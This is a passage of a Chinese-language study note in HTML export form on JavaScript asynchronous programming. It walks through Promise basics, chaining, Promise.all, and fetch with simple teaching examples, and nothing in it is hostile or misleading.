type="image/jpeg" data-filename="3.jpg" width="968"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [117].jpg" type="image/jpeg" data-filename="3.jpg" width="845"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [118].jpg" type="image/jpeg" data-filename="3.jpg" width="926"/></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><hr/><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">Promise 的 基本使用</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">// 1.使用setTimeout</span></div><div><span style="font-size: 12pt;">// setTimeout(() =&gt; {</span></div><div><span style="font-size: 12pt;">//   console.log('Hello World');</span></div><div><span style="font-size: 12pt;">// }, 1000)</span></div><div><br/></div><div><span style="font-size: 12pt;">// 什么情况下会用到 Promise?</span></div><div><font style="font-size: 12pt;">// 一般情况下是有异步操作时，使用 Promise 对这个异步操作进行封装</font></div><div><font style="font-size: 12pt;">// new -&gt; 构造函数(1.保存了一些状态信息  2.执行传入的函数)</font></div><div><font style="font-size: 12pt;">// <font>传入两个 resolve、reject 参数,</font> resolve、reject 本身又是函数，执行传入的回调函数时</font></div><div><span style="font-size: 12pt;">new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">  setTimeout(() =&gt; {</span></div><div><span style="font-size: 12pt;">    // 成功的时候调用resolve</span></div><div><span style="font-size: 12pt;">    // resolve('Hello World')</span></div><div><span style="font-size: 12pt;">    // 失败的时候调用reject</span></div><div><span style="font-size: 12pt;">    reject('error message')</span></div><div><span style="font-size: 12pt;">  }, 1000)</span></div><div><span style="font-size: 12pt;">}).then((data) =&gt; {</span></div><div><span style="font-size: 12pt;">  // 1.100行的处理代码</span></div><div><span style="font-size: 12pt;">  console.log(data);</span></div><div><span style="font-size: 12pt;">  console.log(data);</span></div><div><span style="font-size: 12pt;">  console.log(data);</span></div><div><span style="font-size: 12pt;">  console.log(data);</span></div><div><span style="font-size: 12pt;">  console.log(data);</span></div><div><span style="font-size: 12pt;">}).catch((err) =&gt; {</span></div><div><span style="font-size: 12pt;">  console.log(err);</span></div><div><span style="font-size: 12pt;">})</span></div></div><div><br/></div><div><br/></div><hr/><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">Promise 的链式调用</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">// 参数 -&gt; 函数(resolve, reject)</span></div><div><span style="font-size: 12pt;">// resolve 、reject 本身它们又是函数</span></div><div><br/></div><div><span style="font-size: 12pt;">// 链式编程</span></div><div><span style="font-size: 12pt;">new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">  // 第一次网络请求的代码</span></div><div><span style="font-size: 12pt;">  setTimeout(() =&gt; {</span></div><div><span style="font-size: 12pt;">    resolve()</span></div><div><span style="font-size: 12pt;">  }, 1000)</span></div><div><span style="font-size: 12pt;">}).then(() =&gt; {</span></div><div><span style="font-size: 12pt;">  // 第一次拿到结果的处理代码</span></div><div><span style="font-size: 12pt;">  console.log('Hello World');</span></div><div><span style="font-size: 12pt;">  console.log('Hello World');</span></div><div><span style="font-size: 12pt;">  console.log('Hello World');</span></div><div><span style="font-size: 12pt;">  console.log('Hello World');</span></div><div><span style="font-size: 12pt;">  console.log('Hello World');</span></div><div><span style="font-size: 12pt;">  console.log('Hello World');</span></div><div><span style="font-size: 12pt;">  return new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">    // 第二次网络请求的代码</span></div><div><span style="font-size: 12pt;">    setTimeout(() =&gt; {</span></div><div><span style="font-size: 12pt;">      resolve()</span></div><div><span style="font-size: 12pt;">    }, 1000)</span></div><div><span style="font-size: 12pt;">  })</span></div><div><span style="font-size: 12pt;">}).then(() =&gt; {</span></div><div><span style="font-size: 12pt;">  // 第二次处理的代码</span></div><div><span style="font-size: 12pt;">  console.log('Hello Vuejs');</span></div><div><span style="font-size: 12pt;">  console.log('Hello Vuejs');</span></div><div><span style="font-size: 12pt;">  console.log('Hello Vuejs');</span></div><div><span style="font-size: 12pt;">  console.log('Hello Vuejs');</span></div><div><span style="font-size: 12pt;">  console.log('Hello Vuejs');</span></div><div><span style="font-size: 12pt;">  console.log('Hello Vuejs');</span></div><div><span style="font-size: 12pt;">  return new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">    // 第三次网络请求的代码</span></div><div><span style="font-size: 12pt;">    setTimeout(() =&gt; {</span></div><div><span style="font-size: 12pt;">      resolve()</span></div><div><span style="font-size: 12pt;">    })</span></div><div><span style="font-size: 12pt;">  })</span></div><div><span style="font-size: 12pt;">}).then(() =&gt; {</span></div><div><span style="font-size: 12pt;">  // 第三次处理的代码</span></div><div><span style="font-size: 12pt;">  console.log('Hello Python');</span></div><div><span style="font-size: 12pt;">  console.log('Hello Python');</span></div><div><span style="font-size: 12pt;">  console.log('Hello Python');</span></div><div><span style="font-size: 12pt;">  console.log('Hello Python');</span></div><div><span style="font-size: 12pt;">  console.log('Hello Python');</span></div><div><span style="font-size: 12pt;">})</span></div></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">Promise 的链式调用二</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">new Promise((resolve, reject) =&gt; { 里面的代码}) 包裹一个具有异步操作（比如</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">发送异步请求</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">）</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">的函数，里面的代码会立即执行</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">resolve 放在异步请求函数中的某一行中被调用，负责接收</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">请求成功后的响应结果，并把结果作为参数传给 .then，以 .then(function (参数) {}) 形式接收参数</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt; font-weight: bold;">resolve('aaa')</span></div></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">.then 链式调用</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">处理响应结果</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">的</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">三种返回值形式</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">（不断地对参数进行处理后</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">，然后 return 传给下一个 .then，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">下一个 .then </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">可继续请求也可继续处理结果</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">）</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-weight: bold; font-size: 12pt;">return new Promise(resolve =&gt; {</span></div><div><span style="font-size: 12pt; font-weight: bold;">    resolve(res + '111')</span></div><div><span style="font-size: 12pt; font-weight: bold;">})</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">return Promise.resolve(res + '111')</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">return res + '111'</span></div></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt; font-weight: bold;">return new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt; font-weight: bold;">     reject(</span><span style="font-size: 12pt; font-weight: bold;">'error message'</span><span style="font-size: 12pt; font-weight: bold;">)</span></div><div><span style="font-size: 12pt; font-weight: bold;">})</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">return Promise.reject('error message')</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">throw 'error message'</span></div></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">// 请求一:</span></div><div><span style="font-size: 12pt;">let isResult1 = false</span></div><div><span style="font-size: 12pt;">let isResult2 = false</span></div><div><span style="font-size: 12pt;">$ajax({</span></div><div><span style="font-size: 12pt;">  url: '',</span></div><div><span style="font-size: 12pt;">  success: function () {</span></div><div><span style="font-size: 12pt;">    console.log('结果1');</span></div><div><span style="font-size: 12pt;">    isResult1 = true</span></div><div><span style="font-size: 12pt;">    handleResult()</span></div><div><span style="font-size: 12pt;">  }</span></div><div><span style="font-size: 12pt;">})</span></div><div><span style="font-size: 12pt;">// 请求二:</span></div><div><span style="font-size: 12pt;">$ajax({</span></div><div><span style="font-size: 12pt;">  url: '',</span></div><div><span style="font-size: 12pt;">  success: function () {</span></div><div><span style="font-size: 12pt;">    console.log('结果2');</span></div><div><span style="font-size: 12pt;">    isResult2 = true</span></div><div><span style="font-size: 12pt;">    handleResult()</span></div><div><span style="font-size: 12pt;">  }</span></div><div><span style="font-size: 12pt;">})</span></div><div><span style="font-size: 12pt;">function handleResult() {</span></div><div><span style="font-size: 12pt;">  if (isResult1 &amp;&amp; isResult2) {</span></div><div><span style="font-size: 12pt;">    //</span></div><div><span style="font-size: 12pt;">  }</span></div><div><span style="font-size: 12pt;">}</span></div><div><br/></div><div><span style="font-size: 12pt;">// wrapped into</span></div><div><span style="font-size: 12pt;">// 网络请求: aaa -&gt; 自己处理(10行)</span></div><div><span style="font-size: 12pt;">// 处理: aaa111 -&gt; 自己处理(10行)</span></div><div><span style="font-size: 12pt;">// 处理: aaa111222 -&gt; 自己处理</span></div><div><span style="font-size: 12pt;">// new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">//   setTimeout(() =&gt; {</span></div><div><span style="font-size: 12pt;">//     </span><span style="font-size: 12pt; font-weight: bold;">resolve('aaa')</span></div><div><span style="font-size: 12pt;">//   }, 1000)</span></div><div><span style="font-size: 12pt;">// }).then(res =&gt; {</span></div><div><span style="font-size: 12pt;">//   // 1.自己处理10行代码</span></div><div><span style="font-size: 12pt;">//   console.log(res, '第一层的10行处理代码');</span></div><div><span style="font-size: 12pt;">//</span></div><div><span style="font-size: 12pt;">//   // 2.对结果进行第一次处理</span></div><div><span style="font-size: 12pt;">//   </span><span style="font-size: 12pt; font-weight: bold;">return new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">//     </span><span style="font-size: 12pt; font-weight: bold;">// resolve(res + '111')</span></div><div><span style="font-size: 12pt;">//     </span><span style="font-size: 12pt; font-weight: bold;">reject('err')</span></div><div><span style="font-size: 12pt;">//   </span><span style="font-size: 12pt; font-weight: bold;">})</span></div><div><span style="font-size: 12pt;">// }).then(res =&gt; {</span></div><div><span style="font-size: 12pt;">//   console.log(res, '第二层的10行处理代码');</span></div><div><span style="font-size: 12pt;">//</span></div><div><span style="font-size: 12pt;">//   </span><span style="font-size: 12pt; font-weight: bold;">return new Promise(resolve =&gt; {</span></div><div><span style="font-size: 12pt;">//     </span><span style="font-size: 12pt; font-weight: bold;">resolve(res + '222')</span></div><div><span style="font-size: 12pt;">//   </span><span style="font-size: 12pt; font-weight: bold;">})</span></div><div><span style="font-size: 12pt;">// }).then(res =&gt; {</span></div><div><span style="font-size: 12pt;">//   </span><span style="font-size: 12pt; font-weight: bold;">console.log(res, '第三层的10行处理代码');</span></div><div><span style="font-size: 12pt;">// }).catch(err =&gt; {</span></div><div><span style="font-size: 12pt;">//   console.log(err);</span></div><div><span style="font-size: 12pt;">// })</span></div><div><br/></div><div><span style="font-size: 12pt;">// new Promise(resolve =&gt; resolve(结果))简写</span></div><div><span style="font-size: 12pt;">new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">  setTimeout(() =&gt; {</span></div><div><span style="font-size: 12pt;">    </span><span style="font-size: 12pt; font-weight: bold;">resolve('aaa')</span></div><div><span style="font-size: 12pt;">  }, 1000)</span></div><div><span style="font-size: 12pt;">}).then(res =&gt; {</span></div><div><span style="font-size: 12pt;">  // 1.自己处理10行代码</span></div><div><span style="font-size: 12pt;">  console.log(res, '第一层的10行处理代码');</span></div><div><span style="font-size: 12pt;">  // 2.对结果进行第一次处理</span></div><div><span style="font-size: 12pt;"> </span><span style="font-size: 12pt; font-weight: bold;"> return Promise.resolve(res + '111')</span></div><div><span style="font-size: 12pt;">}).then(res =&gt; {</span></div><div><span style="font-size: 12pt;">  console.log(res, '第二层的10行处理代码');</span></div><div><span style="font-size: 12pt;">  </span><span style="font-size: 12pt; font-weight: bold;">return Promise.resolve(res + '222')</span></div><div><span style="font-size: 12pt;">}).then(res =&gt; {</span></div><div><span style="font-size: 12pt;">  </span><span style="font-size: 12pt; font-weight: bold;">console.log(res, '第三层的10行处理代码');</span></div><div><span style="font-size: 12pt;">})</span></div><div><br/></div><div><span style="font-size: 12pt;">// 省略掉Promise.resolve</span></div><div><span style="font-size: 12pt;">new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">  setTimeout(() =&gt; {</span></div><div><span style="font-size: 12pt;">    </span><span style="font-size: 12pt; font-weight: bold;">resolve('aaa')</span></div><div><span style="font-size: 12pt;">  }, 1000)</span></div><div><span style="font-size: 12pt;">}).then(res =&gt; {</span></div><div><span style="font-size: 12pt;">  // 1.自己处理10行代码</span></div><div><span style="font-size: 12pt;">  console.log(res, '第一层的10行处理代码');</span></div><div><span style="font-size: 12pt;">  // 2.对结果进行第一次处理</span></div><div><span style="font-size: 12pt;">  </span><span style="font-size: 12pt; font-weight: bold;">return res + '111'</span></div><div><span style="font-size: 12pt;">}).then(res =&gt; {</span></div><div><span style="font-size: 12pt;">  console.log(res, '第二层的10行处理代码');</span></div><div><span style="font-size: 12pt;"> </span><span style="font-size: 12pt; font-weight: bold;"> return res + '222'</span></div><div><span style="font-size: 12pt;">}).then(res =&gt; {</span></div><div><span style="font-size: 12pt;">  </span><span style="font-size: 12pt; font-weight: bold;">console.log(res, '第三层的10行处理代码');</span></div><div><span style="font-size: 12pt;">})</span></div><div><br/></div><div><span style="font-size: 12pt;">new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">  setTimeout(() =&gt; {</span></div><div><span style="font-size: 12pt;">    resolve('aaa')</span></div><div><span style="font-size: 12pt;">  }, 1000)</span></div><div><span style="font-size: 12pt;">}).then(res =&gt; {</span></div><div><span style="font-size: 12pt;">  // 1.自己处理10行代码</span></div><div><span style="font-size: 12pt;">  console.log(res, '第一层的10行处理代码');</span></div><div><span style="font-size: 12pt;">  // 2.对结果进行第一次处理</span></div><div><span style="font-size: 12pt;">  // return Promise.reject('error message')</span></div><div><span style="font-size: 12pt;">  throw 'error message'</span></div><div><span style="font-size: 12pt;">}).then(res =&gt; {</span></div><div><span style="font-size: 12pt;">  console.log(res, '第二层的10行处理代码');</span></div><div><span style="font-size: 12pt;">  return Promise.resolve(res + '222')</span></div><div><span style="font-size: 12pt;">}).then(res =&gt; {</span></div><div><span style="font-size: 12pt;">  console.log(res, '第三层的10行处理代码');</span></div><div><span style="font-size: 12pt;">}).catch(err =&gt; {</span></div><div><span style="font-size: 12pt;">  console.log(err);</span></div><div><span style="font-size: 12pt;">})</span></div></div><div><br/></div><div><br/></div><hr/><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">Promise all 方法的使用</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">// 请求一:</span></div><div><span style="font-size: 12pt;">// let isResult1 = false</span></div><div><span style="font-size: 12pt;">// let isResult2 = false</span></div><div><span style="font-size: 12pt;">// $ajax({</span></div><div><span style="font-size: 12pt;">//   url: '',</span></div><div><span style="font-size: 12pt;">//   success: function () {</span></div><div><span style="font-size: 12pt;">//     console.log('结果1');</span></div><div><span style="font-size: 12pt;">//     isResult1 = true</span></div><div><span style="font-size: 12pt;">//     handleResult()</span></div><div><span style="font-size: 12pt;">//   }</span></div><div><span style="font-size: 12pt;">// })</span></div><div><span style="font-size: 12pt;">// // 请求二:</span></div><div><span style="font-size: 12pt;">// $ajax({</span></div><div><span style="font-size: 12pt;">//   url: '',</span></div><div><span style="font-size: 12pt;">//   success: function () {</span></div><div><span style="font-size: 12pt;">//     console.log('结果2');</span></div><div><span style="font-size: 12pt;">//     isResult2 = true</span></div><div><span style="font-size: 12pt;">//     handleResult()</span></div><div><span style="font-size: 12pt;">//   }</span></div><div><span style="font-size: 12pt;">// })</span></div><div><span style="font-size: 12pt;">//</span></div><div><span style="font-size: 12pt;">// function handleResult() {</span></div><div><span style="font-size: 12pt;">//   if (isResult1 &amp;&amp; isResult2) {</span></div><div><span style="font-size: 12pt;">//     //</span></div><div><span style="font-size: 12pt;">//   }</span></div><div><span style="font-size: 12pt;">// }</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">Promise.all([</span></div><div><span style="font-size: 12pt;">    // new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">    //   $.ajax({</span></div><div><span style="font-size: 12pt;">    //     url: 'url1',</span></div><div><span style="font-size: 12pt;">    //     success: function (data) {</span></div><div><span style="font-size: 12pt;">    //       resolve(data)</span></div><div><span style="font-size: 12pt;">    //     }</span></div><div><span style="font-size: 12pt;">    //   })</span></div><div><span style="font-size: 12pt;">    // }),</span></div><div><span style="font-size: 12pt;">    // new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">    //   $.ajax({</span></div><div><span style="font-size: 12pt;">    //     url: 'url2',</span></div><div><span style="font-size: 12pt;">    //     success: function (data) {</span></div><div><span style="font-size: 12pt;">    //       resolve(data)</span></div><div><span style="font-size: 12pt;">    //     }</span></div><div><span style="font-size: 12pt;">    //   })</span></div><div><span style="font-size: 12pt;">    // })</span></div><div><span style="font-size: 12pt;">  new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">    setTimeout(() =&gt; {</span></div><div><span style="font-size: 12pt;">      resolve({name: 'why', age: 18})</span></div><div><span style="font-size: 12pt;">    }, 2000)</span></div><div><span style="font-size: 12pt;">  }),</span></div><div><span style="font-size: 12pt;">  new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">    setTimeout(() =&gt; {</span></div><div><span style="font-size: 12pt;">      resolve({name: 'kobe', age: 19})</span></div><div><span style="font-size: 12pt;">    }, 1000)</span></div><div><span style="font-size: 12pt;">  })</span></div><div><span style="font-size: 12pt;">]).then(results =&gt; {</span></div><div><span style="font-size: 12pt;">  console.log(results);</span></div><div><span style="font-size: 12pt;">})</span></div></div><div><b style="font-size: 12pt;"><br/></b></div><div><b style="font-size: 12pt;"><br/></b></div><hr/><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">fetch</span></div><div><br/></div><div><span style="font-size: 12pt;">我们来执行一个 POST 请求，获取消息，不过只针对 ID 为 12 的用户 Felix</span></div><div><br/></div><div><span style="font-size: 12pt;">执行 POST 请求</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [119].jpg" type="image/jpeg" data-filename="3.jpg" width="646"/></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">请求回调</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [120].jpg" type="image/jpeg" data-filename="3.jpg" width="659"/></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">最后调用带有 url 和 params 的 fetch 方法</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [121].jpg" type="image/jpeg" data-filename="3.jpg" width="649"/></div><div><br/></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">let request = new XMLHttpRequest();</span></div><div><span style="font-size: 12pt;">request.open('GET', url);</span></div><div><span style="font-size: 12pt;">request.responseType = 'text';</span></div><div><span style="font-size: 12pt;">request.onload = function() {</span></div><div><span style="font-size: 12pt;">  poemDisplay.textContent = request.response;</span></div><div><span style="font-size: 12pt;">};</span></div><div><span style="font-size: 12pt;">request.send();</span></div></div><div><br/></div><div><span style="font-size: 12pt;">fetch() 返回一个promise，可以</span><span style="font-size: 12pt;">像这样替换掉所有关于XHR的代码:</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">fetch(url).then(function(response) {</span></div><div><span style="font-size: 12pt;">  response.text().then(function(text) {</span></div><div><span style="font-size: 12pt;">    poemDisplay.textContent = text;</span></div><div><span style="font-size: 12pt;">  });</span></div><div><span style="font-size: 12pt;">});</span></div></div><div><br/></div><div><a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Client-side_web_APIs/Fetching_data" style="font-size: 12pt;">https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Client-side_web_APIs/Fetching_data</a></div><div><br/></div><div><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch" style="font-size: 12pt;">https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch</a></div><div><b style="font-size: 12pt;"><br/></b></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">let promise = fetch(url);</span></div></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">执行这条语句，表示向 url 发出网络请求并返回一个 promise。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">当远程服务器返回 响应header 时</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">（是在全部响应下载完成前）</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">也就是读取数据完成时，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">该 promise 使用一个 response 对象当作 resolve 的结果进行接收。</span></div><div><br/></div><div><span style="font-size: 12pt;">为了读取完整的响应，我们调用 response.text() 方法,，将其解析为 text：</span></div><div><br/></div><div><span style="font-size: 12pt;">当全部文本（full text）内容从远程服务器下载完成后，它会返回一个 promise，该 promise 以刚刚下载完成的这个文本作为 result 。</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">下面这段代码向 user.json 发送请求，并从服务器加载该文本：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">fetch('/article/promise-chaining/user.json')</span></div><div><span style="font-size: 12pt;">  /</span><span style="font-size: 12pt; font-weight: bold;">/ 当远程服务器响应时，下面的 .then 开始执行</span></div><div><span style="font-size: 12pt; font-weight: bold;">  .then(function(response) {</span></div><div><span style="font-weight: bold; font-size: 12pt;">    // 当 user.json 加载完成时，response.text()</span> <span style="font-weight: bold; font-size: 12pt;">带有响应全部文本（full text) 并</span><span style="font-weight: bold; font-size: 12pt;">返回一个新的 promise，</span></div><div><span style="font-size: 12pt; font-weight: bold;">    </span><span style="font-size: 12pt; font-weight: bold;">// 该 promise 以加载的 user.json 为 result ，换句话说就是 user.json 会传给下一个 .then() 的 text</span></div><div><span style="font-size: 12pt;">   </span><span style="font-size: 12pt; font-weight: bold;"> return response.text();</span></div><div><span style="font-size: 12pt; font-weight: bold;">  })</span></div><div><span style="font-size: 12pt; font-weight: bold;">  .then(function(text) {</span></div><div><span style="font-size: 12pt;">    </span><span style="font-size: 12pt; font-weight: bold;">// ...这是远程文件的内容</span></div><div><span style="font-size: 12pt; font-weight: bold;">    alert(text); // {&quot;name&quot;: &quot;iliakan&quot;, &quot;isAdmin&quot;: true}</span></div><div><span style="font-size: 12pt; font-weight: bold;">  });</span></div></div><div><br/></div><div><span style="font-size: 12pt;">从 fetch 返回的 response 对象还包括 response.json() 方法，该方法读取远程数据并将其解析为 JSON。</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">// 同上，但是使用 response.json() 将远程内容解析为 JSON</span></div><div><span style="font-size: 12pt;">fetch('/article/promise-chaining/user.json')</span></div><div><span style="font-size: 12pt;">  .</span><span style="font-size: 12pt; font-weight: bold;">then(response =&gt; response.json())</span></div><div><span style="font-size: 12pt; font-weight: bold;">  .then(user =&gt; alert(user.name)); // iliakan, got user name</span></div></div><div><br/></div><div><span style="font-size: 12pt;">将代码拆分为可重用的函数：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt; font-weight: bold;">function loadJson(url) {</span></div><div><span style="font-size: 12pt; font-weight: bold;">  return fetch(url)</span></div><div><span style="font-size: 12pt; font-weight: bold;">    .then(response =&gt; response.json());</span></div><div><span style="font-size: 12pt; font-weight: bold;">}</span></div><div><br/></div><div><span style="font-size: 12pt;">function loadGithubUser(name) {</span></div><div><span style="font-size: 12pt;">  return fetch(`https://api.github.com/users/${name}`)</span></div><div><span style="font-size: 12pt;">    .then(response =&gt; response.json());</span></div><div><span style="font-size: 12pt;">}</span></div><div><br/></div><div><span style="font-size: 12pt;">function showAvatar(githubUser) {</span></div><div><span style="font-size: 12pt;">  return new Promise(function(resolve, reject) {</span></div><div><span style="font-size: 12pt;">    let img = document.createElement('img');</span></div><div><span style="font-size: 12pt;">    img.src = githubUser.avatar_url;</span></div><div><span style="font-size: 12pt;">    img.className = &quot;promise-avatar-example&quot;;</span></div><div><span style="font-size: 12pt;">    document.body.append(img);</span></div><div><span style="font-size: 12pt;">    setTimeout(() =&gt; {</span></div><div><span style="font-size: 12pt;">      img.remove();</span></div><div><span style="font-size: 12pt;">      resolve(githubUser);</span></div><div><span style="font-size: 12pt;">    }, 3000);</span></div><div><span style="font-size: 12pt;">  });</span></div><div><span style="font-size: 12pt;">}</span></div><div><br/></div><div><span style="font-size: 12pt;">// 使用它们：</span></div><div><span style="font-size: 12pt; font-weight: bold;">loadJson('/article/promise-chaining/user.json')</span></div><div><span style="font-size: 12pt;">  .then(user =&gt;</span> <span style="font-size: 12pt; font-weight: bold;">loadGithubUser(user.name)</span><span style="font-size: 12pt;">)</span></div><div><span style="font-size: 12pt;">  .then(</span><span style="font-size: 12pt; font-weight: bold;">showAvatar</span><span style="font-size: 12pt;">)</span></div><div><span style="font-size: 12pt;">  </span><span style="font-size: 12pt; font-weight: bold; color: rgb(255, 0, 0);">.then(githubUser =&gt; alert(`Finished showing ${githubUser.name}`));</span></div><div><span style="font-size: 12pt;">  // ...</span></div></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">一个好的做法是：异步行为应该始终返回一个 promise。</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: 